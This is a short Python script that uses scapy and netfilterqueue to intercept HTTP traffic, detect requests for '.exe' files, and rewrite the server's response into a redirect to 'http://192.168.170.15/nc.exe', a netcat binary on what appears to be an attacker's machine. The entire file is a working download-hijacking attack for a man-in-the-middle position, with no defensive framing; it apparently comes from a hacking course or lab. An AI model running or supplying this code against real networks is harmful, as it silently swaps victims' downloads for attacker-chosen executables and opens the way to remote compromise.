#!/usr/bin/python

import scapy.all as scapy
import netfilterqueue

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    # Remove checksum and len
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):

    scapy_pack = scapy.IP(packet.get_payload())

    try:
        if scapy_pack.haslayer(scapy.Raw):
            if scapy_pack[scapy.TCP].dport == 10000:

                # print("[+] HTTP Request :]\n")
                if ".exe" in scapy_pack[scapy.Raw].load and "192.168.170.15" not in scapy_pack[scapy.Raw].load:
                    print("[*] exe File requested !")
                    ack_list.append(scapy_pack[scapy.TCP].ack)
                    # print(ack_list)
                    # print(scapy_pack.show())

            elif scapy_pack[scapy.TCP].sport == 10000:
                # print("[+] HTTP Response\n")
                if scapy_pack[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_pack[scapy.TCP].seq)
                    print("[+] Replacing file ")
                    # Modify HTTP response -> redirect
                    # craft the new Response
                    set_load(scapy_pack, "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.170.15/nc.exe\n\n")
                    packet.set_payload(str(scapy_pack))

    except IndexError:
        pass

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(1, process_packet)
queue.run()
